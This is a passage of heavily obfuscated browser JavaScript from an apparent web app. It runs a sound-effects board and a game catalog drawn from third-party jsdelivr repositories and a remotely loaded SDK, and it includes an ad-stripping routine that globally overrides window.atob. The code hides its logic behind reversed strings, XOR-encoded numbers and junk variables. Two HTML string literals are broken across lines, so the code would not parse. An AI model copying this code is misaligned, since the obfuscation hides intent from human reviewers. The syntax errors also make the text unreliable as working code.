    if (!_0x866ca['ok']) throw new Error(`HTTP ${_0x866ca['status']} for ${_0xfceefc}`);
    const _0x28faf = await _0x866ca['json']();
    return keyword ? _0x28faf['results']['map'](r => ({
        "title": r['title'],
        "src": _sblSrc(r['file'])
    })) : _0x28faf['results']['data']['map'](r => ({
        "title": r['name'],
        "src": _sblSrc(r['audio'])
    }));
}
async function getEffects(pageNum = 672383 ^ 672382, keyword = null) {
    const [myinstants, soundButtonsLab] = await Promise['all']([_getMyinstantsEffects(pageNum, keyword)['catch'](() => []), _getSoundButtonsLabEffects(pageNum, keyword)['catch'](() => [])]);
    return [...myinstants, ...soundButtonsLab];
}
const _effectsVirt = _makeGridVirtualizer("effectsGridWrap", "effectsGridSizer", "effectsGrid", e => _buildEffectButton(e['title'], e['src']), () => _loadEffectsPage());

function openEffects() {
    document['getElementById']("neercSstceffe".split("").reverse().join(""))['classList']['add']("nepo".split("").reverse().join(""));
    if (!_effectsLoaded) {
        _effectsReload(null);
    } else if (!_effectsVirt['isMounted']()) {
        _renderEffectsList();
        _effectsVirt['restore'](_effectsScrollTop);
    }
}

function closeEffects() {
    var _0xbb8d = (214130 ^ 214131) + (466728 ^ 466720);
    const _0x5957c = document['getElementById']("effectsScreen");
    _0xbb8d = 'qohkio';
    _effectsScrollTop = _effectsVirt['scrollTop']();
    _0x5957c['classList']['remove']("nepo".split("").reverse().join(""));
    setTimeout(() => {
        if (!_0x5957c['classList']['contains']("open")) {
            _effectsLoadGen++;
            _effectsLoading = false;
            _effectsVirt['clear']();
        }
    }, 605709 ^ 606159);
}

function _renderEffectSkeletons(grid, count) {
    grid['innerHTML'] = '';
    for (let i = 598438 ^ 598438; i < count; i++) {
        const _0x62235f = document['createElement']("div");
        _0x62235f['className'] = "noteleks ntb-tceffe".split("").reverse().join("");
        grid['appendChild'](_0x62235f);
    }
}

function _fillingEffectSkeletonCount(wrap, _0x579e, _0x8edfbf, _0x95ga3c) {
    var _0x1ac4c = (818269 ^ 818268) + (622865 ^ 622870);
    _0x579e = 310575 ^ 310603;
    _0x1ac4c = (592016 ^ 592016) + (716282 ^ 716281);
    _0x95ga3c = 198729 ^ 198721;
    _0x8edfbf = (894881 ^ 894882) + (431055 ^ 431052);
    const _0xa51a = Math['max'](658121 ^ 658120, Math['floor']((wrap['clientWidth'] + _0x95ga3c) / (_0x579e + _0x95ga3c)));
    var _0x3_0xb59 = (121729 ^ 121735) + (793037 ^ 793028);
    const _0xae0d = _0x579e;
    _0x3_0xb59 = "decdmd".split("").reverse().join("");
    const _0x0af31e = Math['max'](164425 ^ 164424, Math['ceil'](wrap['clientHeight'] * 1.6 / (_0xae0d + _0x95ga3c)));
    return _0xa51a * _0x0af31e;
}

function _effectsReload(keyword, _0x78463e) {
    _effectsPage = 809118 ^ 809119;
    _effectsKeyword = keyword || null;
    _effectsLoading = false;
    _effectsExhausted = false;
    _effectsAll = [];
    _effectsLoadGen++;
    _effectsScrollTop = 583623 ^ 583623;
    _effectsVirt['reset']();
    _effectsVirt['enterFlow']();
    const _0xc80e = document['getElementById']("parWdirGstceffe".split("").reverse().join(""));
    _0x78463e = 'iehjke';
    _renderEffectSkeletons(document['getElementById']("effectsGrid"), _fillingEffectSkeletonCount(_0xc80e));
    _0xc80e['scrollTop'] = 945004 ^ 945004;
    _loadEffectsPage();
}

function _renderEffectsList() {
    if (!_effectsAll['length']) return;
    _effectsVirt['exitFlow']();
    _effectsVirt['setItems'](_effectsAll);
}

function _buildEffectButton(title, src, _0xf3_0x6f6, _0x731bb, _0x8c74b, _0xc27bb) {
    _0xf3_0x6f6 = "gvs/0002/gro.3w.www//:ptth".split("").reverse().join("");
    const _0x04b86a = document['createElement']("button");
    _0x731bb = 197576 ^ 197569;
    _0x04b86a['className'] = "effect-btn";
    const _0x64a91b = document['createElementNS'](_0xf3_0x6f6, "gvs".split("").reverse().join(""));
    _0x64a91b['setAttribute']("viewBox", "0 0 24 24");
    const _0x5c86f = document['createElementNS'](_0xf3_0x6f6, "nogylop".split("").reverse().join(""));
    _0x5c86f['setAttribute']("stniop".split("").reverse().join(""), "5 11 91 11 51 6 51 2 9 2 9 6 5 11".split("").reverse().join(""));
    const _0x4g_0xg58 = document['createElementNS'](_0xf3_0x6f6, "htap".split("").reverse().join(""));
    _0x8c74b = 191697 ^ 191705;
    _0x4g_0xg58['setAttribute']("d", "M15.54 8.46a5 5 0 0 1 0 7.07");
    const _0xc7252c = document['createElementNS'](_0xf3_0x6f6, "path");
    _0xc27bb = 329828 ^ 329837;
    _0xc7252c['setAttribute']("d", "41.41 0 1 0 0 01 01a39.4 70.91M".split("").reverse().join(""));
    _0x64a91b['appendChild'](_0x5c86f);
    _0x64a91b['appendChild'](_0x4g_0xg58);
    _0x64a91b['appendChild'](_0xc7252c);
    var _0x4_0x791 = (882675 ^ 882676) + (445825 ^ 445827);
    const _0x17c = document['createElement']("span");
    _0x4_0x791 = (576309 ^ 576305) + (377165 ^ 377163);
    _0x17c['textContent'] = title;
    const _0x948cf = title['length'];
    const _0x23ccb = _0x948cf <= (318886 ^ 318880) ? 722095 ^ 722081 : _0x948cf <= (907330 ^ 907342) ? 305557 ^ 305561 : _0x948cf <= (428565 ^ 428545) ? 507805 ^ 507798 : _0x948cf <= (255154 ^ 255148) ? 775434 ^ 775424 : 808694 ^ 808703;
    _0x17c['style']['fontSize'] = _0x23ccb + "xp".split("").reverse().join("");
    _0x04b86a['appendChild'](_0x64a91b);
    _0x04b86a['appendChild'](_0x17c);
    _0x04b86a['onclick'] = () => _playEffect(_0x04b86a, src);
    if (_currentAudio && _currentAudio['_effectSrc'] === src) _0x04b86a['classList']['add']("playing");
    return _0x04b86a;
}
async function _loadEffectsPage() {
    if (_effectsLoading || _effectsExhausted) return;
    _effectsLoading = !![];
    var _0x5c_0xabe = (387203 ^ 387205) + (908622 ^ 908621);
    const _0x5c293a = _effectsLoadGen;
    _0x5c_0xabe = 'cgblhh';
    const _0x3087fd = document['getElementById']("dirGstceffe".split("").reverse().join(""));
    try {
        const _0x433eg = await getEffects(_effectsPage, _effectsKeyword);
        if (_0x5c293a !== _effectsLoadGen) {
            _effectsLoading = false;
            return;
        }
        if (!_0x433eg['length']) {
            _effectsExhausted = !![];
            if (_effectsPage === (468168 ^ 468169)) {
                _effectsVirt['enterFlow']();
                _0x3087fd['innerHTML'] = "<div class="
                effects - loading ">error loading, refresh and try again</div>";
            }
            _effectsLoading = false;
            return;
        }
        _effectsAll['push'](..._0x433eg);
        _effectsPage++;
        _effectsLoaded = !![];
        _effectsLoading = false;
        _renderEffectsList();
    } catch (e) {
        if (_0x5c293a !== _effectsLoadGen) {
            _effectsLoading = false;
            return;
        }
        if (_effectsPage === (493149 ^ 493148)) {
            _effectsVirt['enterFlow']();
            _0x3087fd['innerHTML'] = ">vid/<daol ot deliaf>\"gnidaol-stceffe\"=ssalc vid<".split("").reverse().join("");
        }
        _effectsLoading = false;
    }
}

function _clearPlayingBtns() {
    document['querySelectorAll'](".effect-btn.playing")['forEach'](b => b['classList']['remove']("gniyalp".split("").reverse().join("")));
}

function _playEffect(btn, src) {
    if (_currentAudio) {
        let _0x6c1c;
        const _0xfc_0xa6b = _currentAudio['_effectSrc'] === src;
        _0x6c1c = (258919 ^ 258918) + (605197 ^ 605188);
        _currentAudio['pause']();
        _currentAudio['currentTime'] = 823192 ^ 823192;
        _currentAudio = null;
        _clearPlayingBtns();
        if (_0xfc_0xa6b) return;
    }
    var _0xaa_0xaa8 = (673722 ^ 673714) + (209945 ^ 209948);
    const _0xe88cc = new Audio(src);
    _0xaa_0xaa8 = 'dcpdmo';
    _0xe88cc['volume'] = _effectsVolume;
    _0xe88cc['_effectSrc'] = src;
    _0xe88cc['play']()['catch'](() => {});
    btn['classList']['add']("playing");
    _currentAudio = _0xe88cc;
    _0xe88cc['onended'] = () => {
        if (_currentAudio !== _0xe88cc) return;
        _currentAudio = null;
        _clearPlayingBtns();
    };
}

function _updateVolumeTrack() {
    const _0xefb = document['getElementById']("volumeSlider");
    const _0xe1294d = parseFloat(_0xefb['value']) * (751676 ^ 751704);
    _0xefb['style']['background'] = `linear-gradient(to right, var(--accent) ${_0xe1294d}%, rgba(255,255,255,0.12) ${_0xe1294d}%)`;
}
_updateVolumeTrack();
document['getElementById']("volumeSlider")['addEventListener']("tupni".split("").reverse().join(""), function() {
    _effectsVolume = parseFloat(this['value']);
    if (_currentAudio) _currentAudio['volume'] = _effectsVolume;
    _updateVolumeTrack();
});
document['getElementById']("effectsSearch")['addEventListener']("tupni".split("").reverse().join(""), function() {
    clearTimeout(_effectsSearchTimer);
    const _0x22_0x629 = this['value']['trim']();
    _effectsSearchTimer = setTimeout(() => _effectsReload(_0x22_0x629 || null), 342906 ^ 342564);
});
var _0x3g2 = (971166 ^ 971165) + (331681 ^ 331680);
let _luminReady = false;
_0x3g2 = (748840 ^ 748843) + (505054 ^ 505046);
var _0x6gd58a = (108218 ^ 108211) + (777885 ^ 777884);
let _luminInitPromise = null;
_0x6gd58a = (622781 ^ 622783) + (934987 ^ 934987);
var _0x5_0x89g = (687721 ^ 687727) + (763072 ^ 763078);
let _gamesLoaded = false;
_0x5_0x89g = "okkbfj".split("").reverse().join("");
var _0x77e = (263112 ^ 263118) + (853340 ^ 853343);
let _gamesKeyword = null;
_0x77e = 835241 ^ 835241;
let _gamesSearchTimer = null;
var _0xf4c2df = (609416 ^ 609418) + (331362 ^ 331360);
let _gamesLoadGen = 679657 ^ 679657;
_0xf4c2df = (574028 ^ 574024) + (709289 ^ 709294);
let _gamesScrollTop = 238525 ^ 238525;
const _gamesImgCache = new WeakMap();
const GAMES_CACHE_TTL = (488460 ^ 488468) * (536076 ^ 536112) * (654142 ^ 654082) * (205578 ^ 205026);
let _0x3353fa;
let _gamesDBPromise = null;
_0x3353fa = 'lbddmp';

function _gamesDB() {
    if (_gamesDBPromise) return _gamesDBPromise;
    _gamesDBPromise = new Promise((resolve, reject) => {
        const _0x7fe2b = indexedDB['open']("ehcaCo".split("").reverse().join(""), 210692 ^ 210693);
        _0x7fe2b['onupgradeneeded'] = () => _0x7fe2b['result']['createObjectStore']("ehcac".split("").reverse().join(""));
        _0x7fe2b['onsuccess'] = () => resolve(_0x7fe2b['result']);
        _0x7fe2b['onerror'] = () => {
            _gamesDBPromise = null;
            reject(_0x7fe2b['error']);
        };
    });
    return _gamesDBPromise;
}
async function _loadGamesCacheEntry(key, isValid) {
    try {
        var _0x3a79ag = (223197 ^ 223195) + (544593 ^ 544597);
        const _0x259b9a = await _gamesDB();
        _0x3a79ag = (792395 ^ 792398) + (170978 ^ 170982);
        const _0x9ccg = await new Promise((resolve, reject) => {
            let _0xd3b76d;
            const _0x6fb = _0x259b9a['transaction']("cache", "ylnodaer".split("").reverse().join(""));
            _0xd3b76d = 'bpbknk';
            let _0xa0584f;
            const _0x25ffff = _0x6fb['objectStore']("cache")['get'](key);
            _0xa0584f = 'icgeqe';
            _0x25ffff['onsuccess'] = () => resolve(_0x25ffff['result']);
            _0x25ffff['onerror'] = () => reject(_0x25ffff['error']);
        });
        if (!_0x9ccg || !isValid(_0x9ccg['games']) || Date['now']() - _0x9ccg['ts'] > GAMES_CACHE_TTL) return null;
        return _0x9ccg['games'];
    } catch (e) {
        return null;
    }
}
async function _saveGamesCacheEntry(key, games) {
    try {
        var _0x6_0xc62 = (652823 ^ 652822) + (225302 ^ 225301);
        const _0x8f_0x61a = await _gamesDB();
        _0x6_0xc62 = "lmcenh".split("").reverse().join("");
        await new Promise((resolve, reject) => {
            var _0xdcbe1f = (687615 ^ 687610) + (210509 ^ 210505);
            const _0x9a_0x2f5 = _0x8f_0x61a['transaction']("cache", "readwrite");
            _0xdcbe1f = "ikqoln".split("").reverse().join("");
            _0x9a_0x2f5['objectStore']("cache")['put']({
                "ts": Date['now'](),
                "games": games
            }, key);
            _0x9a_0x2f5['oncomplete'] = resolve;
            _0x9a_0x2f5['onerror'] = () => reject(_0x9a_0x2f5['error']);
        });
    } catch (e) {}
}
var _0xf4b84d = (804979 ^ 804983) + (978885 ^ 978893);
const _luminScriptPromise = loadScript("https://cdn.jsdelivr.net/gh/luminsdk/script/lumin.min.js");
_0xf4b84d = (482996 ^ 483004) + (368756 ^ 368764);

function _initLumin() {
    if (_luminReady) return Promise['resolve']();
    if (_luminInitPromise) return _luminInitPromise;
    _luminInitPromise = _luminScriptPromise['then'](() => Lumin['init']({
        "headless": !![]
    }))['then'](() => {
        _luminReady = !![];
    });
    return _luminInitPromise;
}
const GNM = {
    'index': "https://cdn.jsdelivr.net/gh/freebuisness/assets/zones.json",
    'html': "https://cdn.jsdelivr.net/gh/freebuisness/html@main",
    "covers": "https://cdn.jsdelivr.net/gh/freebuisness/covers@main"
};
let _0x7_0x931;
const UGS = {
    'index': getAsset("nosj.sgu".split("").reverse().join("")),
    'html': "https://cdn.jsdelivr.net/gh/bubbls/ugs-singlefile/UGS-Files"
};
_0x7_0x931 = "cmgdkn".split("").reverse().join("");
const CKV = {
    'index': getAsset("nosj.vkc".split("").reverse().join("")),
    "html": "https://cdn.jsdelivr.net/gh/WanoCapy/ChickenKingsVault@main",
    "covers": "https://cdn.jsdelivr.net/gh/WanoCapy/ChickenKingsVault@main"
};
const _gamesState = {
    'all': null,
    "fetchPromise": null,
    "matches": null
};

function _normalizeGameName(s) {
    return s['toLowerCase']()['replace'](new RegExp("+]9-0z-a^[".split("").reverse().join(""), 'g'), '');
}

function _filterByName(list, keyword) {
    if (!keyword) return list;
    var _0xa7cf = (638575 ^ 638570) + (423461 ^ 423462);
    const k = _normalizeGameName(keyword);
    _0xa7cf = (979691 ^ 979689) + (843792 ^ 843800);
    if (!k) return list;
    return list['filter'](g => g['_norm'] && g['_norm']['includes'](k));
}
async function _fetchAllLuminGames(_0x33gefd) {
    await _initLumin();
    const _0xgb_0xd2b = [];
    _0x33gefd = (317769 ^ 317775) + (228972 ^ 228970);
    let _0xcfbbba = 194747 ^ 194746,
        _0xeddb3e = 887214 ^ 887215;
    do {
        var _0x3d99a = (104209 ^ 104217) + (365592 ^ 365593);
        const _0x5b557g = await Lumin['getGames']({
            "page": _0xcfbbba,
            'limit': 99999
        });
        _0x3d99a = (171095 ^ 171089) + (567956 ^ 567952);
        (_0x5b557g['games'] || [])['forEach'](g => _0xgb_0xd2b['push']({
            'source': "lumin",
            'name': g['name'],
            'id': g['id'],
            "image_token": g['image_token']
        }));
        _0xeddb3e = _0x5b557g['pages'] || 653178 ^ 653179;
        _0xcfbbba++;
    } while (_0xcfbbba <= _0xeddb3e);
    return _0xgb_0xd2b;
}
async function _fetchAllGnmGames() {
    const _0x451dag = await (await fetch(GNM['index']))['json']();
    return _0x451dag['filter'](g => g['url'] && g['url']['startsWith']("}LRU_LMTH{".split("").reverse().join("")) && g['cover'] && !g['name']['startsWith']("[!]"))['map'](g => ({
        "source": "gnm",
        "name": g['name'],
        "url": g['url'],
        'cover': g['cover'],
        "_html": GNM['html'],
        "_covers": GNM['covers']
    }));
}
async function _fetchListSource(meta, sourceName) {
    var _0x7b812f = (593851 ^ 593850) + (138382 ^ 138374);
    const _0x046b1b = await (await fetch(meta['index']))['json']();
    _0x7b812f = (677929 ^ 677920) + (362321 ^ 362327);
    return _0x046b1b['filter'](g => g['url'] && g['url']['startsWith']("}LRU_LMTH{".split("").reverse().join("")) && g['cover'] && !String(g['name'])['startsWith']("[!]"))['map'](g => ({
        'source': sourceName,
        'name': g['name'],
        'url': g['url'],
        "cover": g['cover'],
        "_html": meta['html'],
        '_covers': meta['covers']
    }));
}

function _finalizeGamesCatalog(all, _0x8_0x7aa) {
    const _0xe4_0x7b4 = new Map();
    _0x8_0x7aa = (421281 ^ 421284) + (785244 ^ 785243);
    all['forEach'](g => {
        g['_norm'] = _normalizeGameName(g['name']);
        _0xe4_0x7b4['set'](g['_norm'], (_0xe4_0x7b4['get'](g['_norm']) || 296413 ^ 296413) + (742984 ^ 742985));
    });
    all['forEach'](g => {
        g['displayName'] = g['name'];
        if (_0xe4_0x7b4['get'](g['_norm']) > (771623 ^ 771622)) {
            if (g['source'] === "gnm") {
                g['displayName'] = `${g['name']} (gn-math)`;
            } else if (g['source'] === "ugs") {
                g['displayName'] = `${g['name']} (ugs)`;
            } else if (g['source'] === "vkc".split("").reverse().join("")) {
                g['displayName'] = `${g['name']} (ckv)`;
            } else if (g['source'] === "nimul".split("").reverse().join("")) {
                const _0xa122b = g['id'] && g['id']['includes']("/") ? g['id']['split']("/")[967065 ^ 967065] : g['source'];
                g['displayName'] = `${g['name']} (${_0xa122b})`;
            }
        }
    });
    var _0xb9674a = (992379 ^ 992383) + (922405 ^ 922404);
    const _0x1ccag = new Intl['Collator'](undefined, {
        'sensitivity': "base"
    });
    _0xb9674a = "bljhde".split("").reverse().join("");
    all['sort']((a, b) => _0x1ccag['compare'](a['displayName'], b['displayName']));
    return all;
}
async function _ensureGamesCatalog() {
    if (!_gamesState['all']) {
        if (!_gamesState['fetchPromise']) {
            _gamesState['fetchPromise'] = (async () => {
                const _0x6ga9ed = await _loadGamesCacheEntry("games", g => g && Array['isArray'](g['gnm']));
                let _0xb3a = false,
                    _0x24_0x2b9 = false,
                    _0x9ae1f = false;
                const [lumin, gnm, ugs, ckv] = await Promise['all']([_fetchAllLuminGames()['catch'](() => []), _0x6ga9ed ? _0x6ga9ed['gnm'] : _fetchAllGnmGames()['catch'](() => {
                    _0xb3a = !![];
                    return [];
                }), _0x6ga9ed ? _0x6ga9ed['ugs'] : _fetchListSource(UGS, "ugs")['catch'](() => {
                    _0x24_0x2b9 = !![];
                    return [];
                }), _0x6ga9ed ? _0x6ga9ed['ckv'] : _fetchListSource(CKV, "ckv")['catch'](() => {
                    _0x9ae1f = !![];
                    return [];
                })]);
                if (!_0x6ga9ed && !_0xb3a && !_0x24_0x2b9 && !_0x9ae1f) _saveGamesCacheEntry("games", {
                    'gnm': gnm,
                    'ugs': ugs,
                    'ckv': ckv
                });
                const _0xg056b = new Set();
                const _0x17gae = lumin['filter'](g => {
                    if (_0xg056b['has'](g['id'])) return false;
                    _0xg056b['add'](g['id']);
                    return !![];
                });
                var _0x6cc6cd = (252668 ^ 252668) + (432908 ^ 432901);
                const _0x98f34e = [..._0x17gae, ...gnm, ...ugs, ...ckv];
                _0x6cc6cd = (563259 ^ 563262) + (220878 ^ 220871);
                _gamesState['all'] = _finalizeGamesCatalog(_0x98f34e);
            })();
            _gamesState['fetchPromise']['catch'](() => {
                _gamesState['fetchPromise'] = null;
            });
        }
        await _gamesState['fetchPromise'];
    }
    _gamesState['matches'] = _filterByName(_gamesState['all'], _gamesKeyword);
}

function _gameCardImg(src, alt) {
    const _0xeaa37a = document['createElement']("img");
    _0xeaa37a['className'] = "game-card-img";
    _0xeaa37a['alt'] = alt;
    _0xeaa37a['loading'] = "lazy";
    _0xeaa37a['decoding'] = "cnysa".split("").reverse().join("");
    _0xeaa37a['src'] = src;
    _0xeaa37a['onerror'] = () => {
        let _0xc2_0x4be;
        const _0xdga = document['createElement']("vid".split("").reverse().join(""));
        _0xc2_0x4be = 'mndlfc';
        _0xdga['className'] = "redlohecalp-drac-emag".split("").reverse().join("");
        _0xeaa37a['replaceWith'](_0xdga);
    };
    return _0xeaa37a;
}

function _buildGameCard(g, _0x48beb, _0x75f87d) {
    const _0x7a4dd = document['createElement']("nottub".split("").reverse().join(""));
    _0x7a4dd['className'] = "drac-emag".split("").reverse().join("");
    const _0x74511d = _gamesImgCache['get'](g);
    _0x48beb = (608496 ^ 608501) + (175755 ^ 175759);
    if (_0x74511d) {
        _0x7a4dd['appendChild'](_gameCardImg(_0x74511d, g['displayName']));
    } else {
        const _0x48e2d = document['createElement']("div");
        _0x48e2d['className'] = "redlohecalp-drac-emag".split("").reverse().join("");
        _0x7a4dd['appendChild'](_0x48e2d);
        var _0x078b = (211749 ^ 211744) + (720965 ^ 720965);
        const _0x02bd1c = _gamesLoadGen;
        _0x078b = (773243 ^ 773247) + (559590 ^ 559590);
        _resolveGameImgSrc(g)['then'](src => {
            if (!src || _0x02bd1c !== _gamesLoadGen || !_0x48e2d['isConnected']) return;
            _0x48e2d['replaceWith'](_gameCardImg(src, g['displayName']));
        })['catch'](() => {});
    }
    var _0xb9532a = (614788 ^ 614786) + (378500 ^ 378503);
    const _0xe33aab = document['createElement']("vid".split("").reverse().join(""));
    _0xb9532a = (378369 ^ 378368) + (413663 ^ 413656);
    _0xe33aab['className'] = "game-card-name";
    const _0x5eb8a = document['createElement']("naps".split("").reverse().join(""));
    _0x75f87d = "fgpgfa".split("").reverse().join("");
    _0x5eb8a['textContent'] = g['displayName'];
    _0xe33aab['appendChild'](_0x5eb8a);
    _0x7a4dd['appendChild'](_0xe33aab);
    _0x7a4dd['onclick'] = _gameCardOnClick(g);
    return _0x7a4dd;
}
async function _resolveGameImgSrc(g) {
    if (_gamesImgCache['has'](g)) return _gamesImgCache['get'](g);
    const _0x13ab = g['source'] === "lumin" ? await Lumin['getImageUrl'](g['image_token'])['catch'](() => null) : g['cover']['replace']("}LRU_REVOC{".split("").reverse().join(""), g['_covers']);
    if (_0x13ab) _gamesImgCache['set'](g, _0x13ab);
    return _0x13ab;
}

function _gameCardOnClick(g) {
    if (g['source'] === "nimul".split("").reverse().join("")) return () => openGamePlayer(g['id']);
    var _0xa5d5cb = (472816 ^ 472825) + (442138 ^ 442139);
    const _0x5a172c = g['source'] === "vkc".split("").reverse().join("") ? `${g['_html']}/gamefiles/${encodeURIComponent(g['name'])}.html` : g['_html'] + "/" + g['url']['replace']("{HTML_URL}/", "");
    _0xa5d5cb = 149209 ^ 149201;
    return () => openDirectGame(g['source'], g['name'], _0x5a172c);
}
const _gamesVirt = _makeGridVirtualizer("gamesGridWrap", "gamesGridSizer", "gamesGrid", g => _buildGameCard(g));

function _updateGamesCount() {
    document['getElementById']("tnuoCsemag".split("").reverse().join(""))['textContent'] = _gamesState['matches'] ? _gamesState['matches']['length']['toLocaleString']() + "latoT ".split("").reverse().join("") : '';
}

function _renderGameSkeletons(grid, count) {
    grid['innerHTML'] = '';
    for (let i = 941952 ^ 941952; i < count; i++) {
        const _0x89047a = document['createElement']("div");
        _0x89047a['className'] = "game-card skeleton";
        var _0x398ce = (742963 ^ 742961) + (158177 ^ 158177);
        const _0xdbdeg = document['createElement']("vid".split("").reverse().join(""));
        _0x398ce = "flcodo".split("").reverse().join("");
        _0xdbdeg['className'] = "game-card-placeholder";
        _0x89047a['appendChild'](_0xdbdeg);
        grid['appendChild'](_0x89047a);
    }
}

function _fillingSkeletonCount(wrap, _0x3243cc, _0x6f_0xdb8, _0x78ff7d, _0x25g) {
    var _0x976g = (240083 ^ 240080) + (125606 ^ 125604);
    _0x3243cc = 998791 ^ 998684;
    _0x976g = (352406 ^ 352407) + (110607 ^ 110606);
    _0x6f_0xdb8 = 733520 ^ 733528;
    const _0xb5_0x59e = Math['max'](871979 ^ 871978, Math['floor']((wrap['clientWidth'] + _0x6f_0xdb8) / (_0x3243cc + _0x6f_0xdb8)));
    _0x78ff7d = 733680 ^ 733684;
    const _0x4614a = _0x3243cc * (307702 ^ 307711) / (622277 ^ 622293) + (712853 ^ 712893);
    const _0xb6_0xadg = Math['max'](276206 ^ 276207, Math['ceil'](wrap['clientHeight'] * 1.6 / (_0x4614a + _0x6f_0xdb8)));
    _0x25g = 690888 ^ 690892;
    return _0xb5_0x59e * _0xb6_0xadg;
}

function _renderGamesList() {
    const _0x0665f = document['getElementById']("gamesGrid");
    _updateGamesCount();
    var _0x6fbca = (365021 ^ 365012) + (364174 ^ 364166);
    const _0x3719e = _gamesState['matches'];
    _0x6fbca = 'blqdaj';
    if (!_0x3719e || !_0x3719e['length']) {
        _gamesVirt['reset']();
        _gamesVirt['enterFlow']();
        _0x0665f['innerHTML'] = "<div class="
        games - loading ">no results</div>";
        return;
    }
    if (!document['getElementById']("gamesScreen")['classList']['contains']("open")) return;
    _gamesVirt['exitFlow']();
    _gamesVirt['setItems'](_0x3719e);
}
async function _loadFilteredGames(gen, grid, wrap, opts, _0x47a6gd) {
    const _0xdb1dfb = opts['getList']();
    _0x47a6gd = 742521 ^ 742512;
    if (_0xdb1dfb) {
        _gamesVirt['exitFlow']();
        _gamesState['matches'] = _filterByName(_0xdb1dfb, _gamesKeyword);
        _renderGamesList();
        return;
    }
    _gamesVirt['enterFlow']();
    _renderGameSkeletons(grid, _fillingSkeletonCount(wrap));
    document['getElementById']("gamesCount")['textContent'] = '';
    try {
        await opts['ensureLoaded']();
    } catch (e) {
        if (gen === _gamesLoadGen) {
            _gamesVirt['enterFlow']();
            grid['innerHTML'] = `<div class="games-loading">${opts['errorMsg']}</div>`;
        }
        return;
    }
    if (gen !== _gamesLoadGen) return;
    opts['onLoaded']?.();
    _gamesState['matches'] = _filterByName(opts['getList'](), _gamesKeyword);
    _renderGamesList();
}
async function _gamesReload(keyword, _0xbfcf5c) {
    _gamesKeyword = keyword || null;
    var _0xe137a = (167020 ^ 167012) + (819746 ^ 819747);
    const _0xgg71f = ++_gamesLoadGen;
    _0xe137a = (358951 ^ 358948) + (525055 ^ 525053);
    _gamesScrollTop = 347109 ^ 347109;
    const _0xc62c = document['getElementById']("gamesGrid");
    _0xbfcf5c = 984840 ^ 984846;
    var _0x1aa38d = (948714 ^ 948719) + (575200 ^ 575208);
    const _0x2e629e = document['getElementById']("gamesGridWrap");
    _0x1aa38d = 551813 ^ 551810;
    _gamesVirt['reset']();
    _0x2e629e['scrollTop'] = 535190 ^ 535190;
    if (_cloudEnabled) {
        return _loadFilteredGames(_0xgg71f, _0xc62c, _0x2e629e, {
            'getList': () => _cloudGames['length'] ? _cloudGames : null,
            'ensureLoaded': async () => {
                _cloudGames = await loadCloudGames();
            },
            'errorMsg': 'failed to load cloud games'
        });
    }
    return _loadFilteredGames(_0xgg71f, _0xc62c, _0x2e629e, {
        'getList': () => _gamesState['all'],
        'ensureLoaded': _ensureGamesCatalog,
        'errorMsg': 'failed to load',
        'onLoaded': () => {
            _gamesLoaded = !![];
        }
    });
}

function openGames() {
    document['getElementById']("neercSsemag".split("").reverse().join(""))['classList']['add']("open");
    if (!_gamesLoaded) {
        _gamesReload(null);
    } else if (!_gamesVirt['isMounted']()) {
        _renderGamesList();
        _gamesVirt['restore'](_gamesScrollTop);
    }
}

function closeGames(_0xbbebf) {
    const _0x7f16ba = document['getElementById']("neercSsemag".split("").reverse().join(""));
    _0xbbebf = 'fgjigb';
    _gamesScrollTop = _gamesVirt['scrollTop']();
    _0x7f16ba['classList']['remove']("open");
    setTimeout(() => {
        if (!_0x7f16ba['classList']['contains']("nepo".split("").reverse().join(""))) {
            _gamesVirt['clear']();
        }
    }, 579896 ^ 579834);
}
let _gamePlayerGen = 681537 ^ 681537;
let _skipNextGameAdBlockInject = false;

function _openGamePlayerShell(label) {
    _gamePlayerGen++;
    var _0x56e7fa = (190814 ^ 190811) + (719105 ^ 719106);
    const _0x583f2b = _gamePlayerGen;
    _0x56e7fa = (949670 ^ 949664) + (235051 ^ 235043);
    const _0xbf24bb = document['getElementById']("reyalPemag".split("").reverse().join(""));
    const _0xcb85e = document['getElementById']("gameFrame");
    var _0xe2dad = (565773 ^ 565770) + (167120 ^ 167122);
    const _0xca742c = document['getElementById']("gnidaoLreyalPemag".split("").reverse().join(""));
    _0xe2dad = 'bhdjlp';
    const _0xda820g = document['getElementById']("dIreyalPemag".split("").reverse().join(""));
    if (_cloudSession) teardownCloud(!![]);
    document['getElementById']("parWoediVduolc".split("").reverse().join(""))['style']['display'] = "none";
    _exitStaleFullscreen(_0xbf24bb);
    _0xda820g['textContent'] = label;
    _0xcb85e['style']['display'] = "enon".split("").reverse().join("");
    _0xcb85e['src'] = "knalb:tuoba".split("").reverse().join("");
    _0xca742c['style']['display'] = "xelf".split("").reverse().join("");
    _0xca742c['textContent'] = "…gnidaol".split("").reverse().join("");
    _0xbf24bb['classList']['add']("nepo".split("").reverse().join(""));
    return {
        "gf": _0xcb85e,
        'loading': _0xca742c,
        "gen": _0x583f2b
    };
}

function _dirOf(url) {
    var _0x5961e = (142142 ^ 142135) + (991432 ^ 991433);
    const u = new URL(url);
    _0x5961e = "hnodpp".split("").reverse().join("");
    u['search'] = '';
    u['hash'] = '';
    u['pathname'] = u['pathname']['substring'](205873 ^ 205873, u['pathname']['lastIndexOf']("/") + (720574 ^ 720575));
    return u['toString']();
}

function _withBaseHref(html, baseUrl) {
    if (new RegExp('<base[^>]*>', 'i')['test'](html)) return html;
    if (new RegExp('<head[^>]*>', 'i')['test'](html)) return html['replace'](new RegExp(">)*]>^[(daeh<".split("").reverse().join(""), 'i'), `<head$1><base href="${baseUrl}">`);
    if (new RegExp('<html[^>]*>', 'i')['test'](html)) return html['replace'](new RegExp('<html([^>]*)>', 'i'), `<html$1><head><base href="${baseUrl}"></head>`);
    return `<base href="${baseUrl}">` + html;
}

function _gameAdBlockInit(_0xa5e) {
    const _0x4fbe = window['atob'];
    _0xa5e = 172119 ^ 172112;
    window['atob'] = function(s) {
        var _0x66d5d = (467963 ^ 467966) + (893547 ^ 893546);
        const d = _0x4fbe(s);
        _0x66d5d = 'aemamn';
        return typeof d === "string" && d['includes']("[AV][boot] ") ? null : d;
    };
    var _0x82d8f = (744460 ^ 744462) + (156057 ^ 156062);
    const _0x33dc = setInterval(() => {
        try {
            document['getElementById']("1darabedis".split("").reverse().join(""))?.remove();
            document['getElementById']("sidebarad2")?.remove();
            clearInterval(_0x33dc);
        } catch {}
    }, 914151 ^ 913679);
    _0x82d8f = (724744 ^ 724744) + (592263 ^ 592258);
}

function _ADBLOCKIT(html) {
    var _0xggb36f = (698152 ^ 698153) + (481770 ^ 481762);
